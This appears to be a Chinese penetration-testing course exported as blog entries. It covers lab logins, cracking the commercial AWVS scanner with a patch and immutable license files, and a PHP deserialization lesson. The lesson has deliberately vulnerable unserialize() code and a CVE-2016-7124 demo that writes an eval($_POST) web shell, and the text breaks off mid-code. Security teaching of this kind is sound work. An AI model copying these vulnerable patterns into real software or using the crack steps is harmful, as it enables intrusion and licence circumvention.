src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/58ca7dc93cd642a68b3d165a6f022327.png" alt="image.png"></p><p>16.输入用户名【xiaogang】，密码【123456】，点击登录,登录成功则环境部署完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/6e1a826bb7a94d639d71df8c37824261.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/bdcf29bf83054b429584057f86b36a5e.png" alt="image.png"></p><p>17.浏览器访问 127.0.0.1:82/login.php</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/94faa4aa2240470db79a806592c16e4c.png" alt="image.png"></p><p>18.输入用户名【xiaogang】，密码【123456】，验证码，点击登录,登录成功则环境部署完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/53ac7dd9018d4eee8db144d3510bdc0b.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641873733000/b15d0192e9804e9db873ab1d2467b9cf.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-1-jie-avws-an-zhuang-yu-ji-huo/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-1-jie-avws-an-zhuang-yu-ji-huo/</url>
      
        <content type="html"><![CDATA[<h1 id="第一节-AWVS安装与激活"><a href="#第一节-AWVS安装与激活" class="headerlink" title="第一节-AWVS安装与激活"></a>第一节-AWVS安装与激活</h1><h2 id="1-AWVS简介"><a href="#1-AWVS简介" class="headerlink" title="1.AWVS简介"></a>1.AWVS简介</h2><p>AWVS（Acunetix Web Vulnerability Scanner）是一款知名的<strong>网络漏洞扫描工具</strong>，通过网络爬虫测试网站安全，检测流行的Web应用攻击，如跨站脚本、sql 注入等。据统计，75% 的互联网攻击目标是基于Web的应用程序。</p><h2 id="2-为什么要用AWVS"><a href="#2-为什么要用AWVS" class="headerlink" title="2.为什么要用AWVS"></a>2.为什么要用AWVS</h2><p>在今天，网站的安全是容易被忽视的，黑客具备广泛的攻击手段，例SQL注入，XSS，文件包含，目录遍历，参数篡改，认证攻击等，虽然你配置了正确的防火墙和WAF，但是这些安全防御软件仍然存在策略性的绕过，因此，需要您定期的扫描你的web应用，但是手动检测你所有的web应用是否存在安全漏洞比较复杂和费时，所以您需要一款自动化的web漏洞扫描工具来检测您的web应用是否存在安全漏洞。</p><h2 id="3-windows-安装"><a href="#3-windows-安装" class="headerlink" title="3.windows 安装"></a>3.windows 安装</h2><p>1.解压 awvs14补丁.zip</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/81e865bc2d964e5992df154d068e9b00.png" alt="image.png"></p><p>2.双击 acunetix_14.1.210316110.exe 安装</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/2d71bb4195454a4694ce88dd6c3ff88e.png" alt="image.png"></p><p>3.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0f9e40ee7a7f487199ebcbcbd829cccd.png" alt="image.png"></p><p>4.点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/4a57a401dc784646bb780f98ff4f5c44.png" alt="image.png"></p><p>5.点击【I accept the agreement 】,点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/bf133d8a4e0a4c82b83f777bb7b8aa69.png" alt="image.png"></p><p>6.选择喜欢的位置安装，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/88b1d9decc53420f8e913d962bf9f0c0.png" alt="image.png"></p><p>7.选择喜欢的位置保存 Data，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0b33e0cefcb848b395a5414cb71afae4.png" alt="image.png"></p><p>8.输入账号名：<a href="mailto:admin@msb.com">admin@msb.com</a>,密码：m123456@，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/deb2586fac9942e68ecf8b0f848de948.png" alt="image.png"></p><p>9.选择【Allow remote access to Acunetix】，选择IP，点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/20d3c97cb28d407ba52d8ad48a9320ee.png" alt="image.png"></p><p>10.点击【Next】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/9967226ab34146a0bfeab18109f1eb05.png" alt="image.png"></p><p>11.点击【install】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/fd5c6d67cf7a4be19d5c1348d7e11252.png" alt="image.png"></p><p>12.等待安装完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/def992e831474a3b82acb84da82f5d0d.png" alt="image.png"></p><p>13.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/057f985ac8a34101aa55e2255c31519d.png" alt="image.png"></p><p>14.点击【Finsh】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/41c819b1c8014895a7a808f75f888790.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/b47d1c4b81d448098ca2effdf805161f.png" alt="image.png"></p><p>15.右键【我的电脑】，点击【管理】，选择【服务和应用成序】,点击【服务】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/a9bf3bb1a1b9418ab5567e2aa325bbe4.png" alt="image.png"></p><p>16.右键【Acunetix】和【Acunetix Database】，停止Acunetix和Acunetix Database服务</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/99b73f6746b74eb5aba49d0ae808e4e1.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/292cbd039b4c4e959650b79fc48c08ae.png" alt="image.png"></p><p>17.将【awvs14补丁】里的【license_info.json】 复制到【D:\ProgramData\Acunetix\shared\license】，点击【替换】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/3b23edb624d34503ac1bc702ee4d0497.png" alt="image.png"></p><p>18.将【awvs14补丁】里的【wa_data.dat】复制到【D:\ProgramData\Acunetix\shared\license】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/49338f031ce9493998c03de87ed9ccbc.png" alt="image.png"></p><p>19.将【awvs14补丁】里的【wvsc.exe】复制到【D:\Program Files (x86)\Acunetix\14.1.210316110】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/8cafbb2374d54bbe85d296a8ca2f500b.png" alt="image.png"></p><p>20.右键【Acunetix】和【Acunetix Database】，启动 Acunetix和Acunetix Database服务</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/1e154e0b0ee54e6ea5f057bb25fb2dbc.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0519547b40a34109be8693cb411089d3.png" alt="image.png"></p><p>21.刷新浏览器的管理页面，点击【高级..】,点击【接受风险并继续】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/7bf0bc40416a4ef9995284f6b5bd9e2f.png" alt="image.png"></p><p>22.登录管理员账号 <a href="mailto:admin@msb.com">admin@msb.com</a>,密码：m123456@</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/92cc8f0bd37f41348aef73b4e7a35655.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/ca33061b2639475e9291461f012c901d.png" alt="image.png"></p><h2 id="4-kali-安装AWVS"><a href="#4-kali-安装AWVS" class="headerlink" title="4. kali 安装AWVS"></a>4. kali 安装AWVS</h2><p>1.将acunetix_trial.sh 和 patch_awvs 复制到kali中</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/2f852ac510d54e82bfac2e7cf3ac183a.png" alt="image.png"></p><p>2.修改 acunetix_trial.sh 和 patch_awvs  权限</p><pre class="line-numbers language-none"><code class="language-none">chmod 777 acunetix_trial.sh patch_awvs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.执行安装命令</p><pre class="line-numbers language-none"><code class="language-none">./acunetix_trial.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.点击enter键继续</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/de2f4d0b46ee421d896b08db9e016a80.png" alt="image.png"></p><p>5.一直按住enter键继续</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/047824864f324f0c89e6e37a7824fdb4.png" alt="image.png"></p><p>6.输入yes，点击 【回车】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/aa3d4d4cb50d4e92af6685bc90a9108e.png" alt="image.png"></p><p>7.输入主机名称，点击【回车】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/e91bc8a405054d6fadb58fbc76051884.png" alt="image.png"></p><p>8.输入email ：【<a href="mailto:admin@msb.com">admin@msb.com</a>】点击【回车】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/f3d402f52cdd46e59bdeda18fd704374.png" alt="image.png"></p><p>9.输入Password：【m123456@】点击回车，输入【m123456@】，点击回车</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/00b3b7c2c16a4a899c607e7aadde1aa0.png" alt="image.png"></p><p>10.等待安装完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/9431cda311874684ba3251424cf8b5a7.png" alt="image.png"></p><p>11.把破解补丁复制到指定目录下，并设置好权限，直接运行即可</p><pre class="line-numbers language-none"><code class="language-none">cp -a patch_awvs /home/acunetix/.acunetix_trial/v_190325161/scanner/chmod 777 /home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs/home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/db407d2b36ac498d8e47e079cf18de63.png" alt="image.png"></p><p>12.为了保护原始license不失效，这里尽快执行如下的命令，不然license会被修改然后就无法破解成功。</p><pre class="line-numbers language-none"><code class="language-none">chattr +i /home/acunetix/.acunetix_trial/data/license/license_info.jsonrm -fr /home/acunetix/.acunetix_trial/data/license/wa_data.dattouch /home/acunetix/.acunetix_trial/data/license/wa_data.datchattr +i /home/acunetix/.acunetix_trial/data/license/wa_data.dat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>13.重新启动AWVS进程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart acunetix_trial.service <span class="token comment">#重启进程</span>systemctl start acunetix_trial.service   <span class="token comment">#启动进程</span>systemctl stop acunetix_trial.service    <span class="token comment">#停止进程</span>systemctl status acunetix_trial.service  <span class="token comment">#查看进行状态 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>14.访问：<a href="https://127.0.0.1:13443/">https://127.0.0.1:13443/</a> 进入AWVS首页，点击【Advanced..】,点击【Accept the Risk and Continue】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/228eea4050e84c5bb1a2aa7dddee9c8b.png" alt="image.png"></p><p>15.输入用户名：<a href="mailto:admin@msb.com">admin@msb.com</a>,密码：m123456@ 进行登录</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/5375b020a8184250b679aea740cb4c6e.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/24f077d4968a4f16be2c42d0ca473c9d.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/7de783bf900d46e581cbc78c26b9420c.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/suo-you-zi-liao-xia-zai-di-zhi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/suo-you-zi-liao-xia-zai-di-zhi/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1lLRb1Zo7AvzbBfjqD86AlA?pwd=8888">https://pan.baidu.com/s/1lLRb1Zo7AvzbBfjqD86AlA?pwd=8888</a><br>提取码：8888<br>–来自百度网盘超级会员V3的分享</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/21-fan-xu-lie-hua/php-fan-xu-lie-hua/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/21-fan-xu-lie-hua/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>PHP类与对象 </li><li>PHP Magic函数 </li><li>PHP序列化与反序列化</li><li>反序列化漏洞的出现 </li><li>CTF题目分析 </li><li>Typecho反序列化漏洞 </li><li>PHP反序列化漏洞防御</li></ol><h1 id="PHP类与对象"><a href="#PHP类与对象" class="headerlink" title="PHP类与对象"></a>PHP类与对象</h1><h2 id="类Class"><a href="#类Class" class="headerlink" title="类Class"></a>类Class</h2><p>一个共享相同结构和行为的对象的集合</p><p><img src="assets/image-20221126155421686.png" alt="image-20221126155421686"></p><h2 id="对象Object"><a href="#对象Object" class="headerlink" title="对象Object"></a>对象Object</h2><p>类的实例</p><p><img src="assets/image-20221126155454378.png" alt="image-20221126155454378"></p><h1 id="Magic函数"><a href="#Magic函数" class="headerlink" title="Magic函数"></a>Magic函数</h1><h2 id="Magic-Methods-魔术方法"><a href="#Magic-Methods-魔术方法" class="headerlink" title="Magic Methods 魔术方法"></a>Magic Methods 魔术方法</h2><p><a href="https://www.php.net/__sleep">https://www.php.net/__sleep</a> </p><pre class="line-numbers language-none"><code class="language-none">__construct()， __destruct() __call()， __callStatic() __get()， __set()__isset()， __unset() __sleep()， __wakeup() __serialize(), __unserialize() __toString(), __invoke() __set_state(), __clone() __debugInfo()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数作用"><a href="#函数作用" class="headerlink" title="函数作用"></a>函数作用</h2><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>__construct</td><td>当一个<strong>对象创建</strong>时被调用</td></tr><tr><td>__destruct</td><td>当一个<strong>对象销毁</strong>时被调用</td></tr><tr><td>__toString</td><td>当一个<strong>对象被当作一个字符串</strong>使用</td></tr><tr><td>__sleep</td><td>在对象被序列化<strong>之前</strong>运行</td></tr><tr><td>__wakeup</td><td>在对象被反序列化<strong>之后</strong>被调用</td></tr><tr><td>__serialize()</td><td>对对象调用**serialize()**方法，PHP 7.4.0 起</td></tr><tr><td>__unserialize()</td><td>对对象调用**unserialize()**方法，PHP 7.4.0 起</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>用于从不可访问的属性读取数据</td></tr><tr><td>__set()</td><td>用于将数据写入不可访问的属性</td></tr><tr><td>__isset()</td><td>在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td>__unset()</td><td>在不可访问的属性上使用unset()时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><h1 id="PHP序列化和反序列化"><a href="#PHP序列化和反序列化" class="headerlink" title="PHP序列化和反序列化"></a>PHP序列化和反序列化</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><p><img src="assets/image-20221126160218582.png" alt="image-20221126160218582"></p><h2 id="类型序列化"><a href="#类型序列化" class="headerlink" title="类型序列化"></a>类型序列化</h2><table><thead><tr><th>类型</th><th>格式</th></tr></thead><tbody><tr><td>String</td><td>s:size:value;</td></tr><tr><td>Integer</td><td>i:value;</td></tr><tr><td>Boolean</td><td>b:value;(保存1或0)</td></tr><tr><td>Null</td><td>N;</td></tr><tr><td>Array</td><td>a:size:{key definition;value definition;(repeated per element)}</td></tr><tr><td>Object</td><td>O:strlen(object name):object name : object  size:{s:strlen(property name):property name:property definition;(repeated per property)}</td></tr></tbody></table><h2 id="其他序列化格式"><a href="#其他序列化格式" class="headerlink" title="其他序列化格式"></a>其他序列化格式</h2><p>json字符串 <code>json_encode</code></p><p> xml字符串 <code>wddx_serialize_value</code> </p><p>二进制格式 </p><p>字节数组</p><h2 id="反序列化：注意"><a href="#反序列化：注意" class="headerlink" title="反序列化：注意"></a>反序列化：注意</h2><p>1、如果传递的字符串不可以序列化，则返回 FALSE </p><p>2、如果对象没有预定义，反序列化得到的对象是 </p><p>__PHP_Incomplete_Class</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>1、传输对象</p><p>2、用作缓存（Cookie、Session）</p><h2 id="反序列化与Maigc函数"><a href="#反序列化与Maigc函数" class="headerlink" title="反序列化与Maigc函数"></a>反序列化与Maigc函数</h2><p><code>__wakeup</code> </p><p><code>__unserialize（7.4.0）</code> </p><p>如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略。</p><h1 id="反序列化的出现"><a href="#反序列化的出现" class="headerlink" title="反序列化的出现"></a>反序列化的出现</h1><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="logfile-php"><a href="#logfile-php" class="headerlink" title="logfile.php"></a>logfile.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Class logfile * 功能说明：临时记录日志到error.log文件 * __destruct被调用的时候，删除 error.log 文件 */</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">logfile</span><span class="token punctuation">{</span>    <span class="token comment">//log文件名</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'error.log'</span><span class="token punctuation">;</span>    <span class="token comment">//一些用于储存日志的代码</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">logdata</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'log data:'</span><span class="token operator">.</span><span class="token variable">$text</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br /&gt;'</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//destrcuctor 删除日志文件</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'__destruct deletes '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token operator">.</span><span class="token string single-quoted-string">' file.&lt;br /&gt;'</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>记录日志：file_put_contents() </li><li>类销毁的时候，删除这个日志文件：__destruct()、unlink() </li><li>日志文件的名字通过filename指定</li></ol><h3 id="request-php-利用"><a href="#request-php-利用" class="headerlink" title="request.php 利用"></a>request.php 利用</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * 引用了 logfile文件，包含__destruct方法 * */</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'logfile.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>    <span class="token comment">//类数据</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token comment">//输出数据</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">printdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'User '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">.</span><span class="token string single-quoted-string">' is'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token operator">.</span><span class="token string single-quoted-string">' years old.&lt;br /&gt;'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 通过GET请求参数传入字符</span><span class="token comment">// 此处可以反序列化任意对象</span><span class="token variable">$usr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>unserialize通过GET传输反序列化字符串 </li><li>替换了字符串的filename值，比如index.php </li><li>导致当前目录index.php被删除 </li><li>可以删除任意文件</li></ol><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>unserialize函数的<strong>参数可控</strong>，比如通过GET请求传参（漏洞触发点） </li><li>脚本中定义了<strong>有Magic方法</strong>，方法里面有向php文件做读写数据或者<strong>执行命令的操作</strong>，比如__destruct()、unlink() </li><li>操作的内容需要有对象中的成员<strong>变量的值</strong>，比如 filename</li></ol><h2 id="常见利用函数"><a href="#常见利用函数" class="headerlink" title="常见利用函数"></a>常见利用函数</h2><table><thead><tr><th>类别</th><th>函数</th></tr></thead><tbody><tr><td>命令执行</td><td>exec() passthru() popen() system() ……</td></tr><tr><td>文件操作</td><td>file_put_contents() file_get_contents() unlink() ……</td></tr></tbody></table><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>序列化一个对象 ，修改成员变量的值，达到操作其他 文件或者执行命令的目的</p><h1 id="CTF题目分析"><a href="#CTF题目分析" class="headerlink" title="CTF题目分析"></a>CTF题目分析</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><h3 id="攻防世界：unserialize3"><a href="#攻防世界：unserialize3" class="headerlink" title="攻防世界：unserialize3"></a>攻防世界：unserialize3</h3><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=1013364e-31aa-4643-8322-e126f12c1b82_2&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=1013364e-31aa-4643-8322-e126f12c1b82_2&amp;task_category_id=3</a></p><p><a href="http://61.147.171.105:53418/">http://61.147.171.105:53418</a></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class xctf{public $flag = '111';public function __wakeup(){exit('bad requests');}?code=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CVE-2016-7124示例"><a href="#CVE-2016-7124示例" class="headerlink" title="CVE-2016-7124示例"></a>CVE-2016-7124示例</h3><p>cve7124.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 目标：反序列化的时候绕过__wakeup以达到写文件的操作</span><span class="token comment">// CVE-2016-7124</span><span class="token comment">// PHP5小于5.6.25或PHP7小于7.0.10</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>    <span class="token comment">// 私有成员变量</span>    <span class="token keyword">private</span> <span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">poc</span> <span class="token operator">=</span> <span class="token variable">$poc</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">poc</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST["shell"]);?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fail to getshell!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">// 返回由对象属性组成的关联数组，把所有的属性置空</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">get_object_vars</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=&gt;</span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"waking up...n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/*if(!isset($poc)){    show_source(__FILE__);    die();}*/</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"your payload:"</span><span class="token operator">.</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 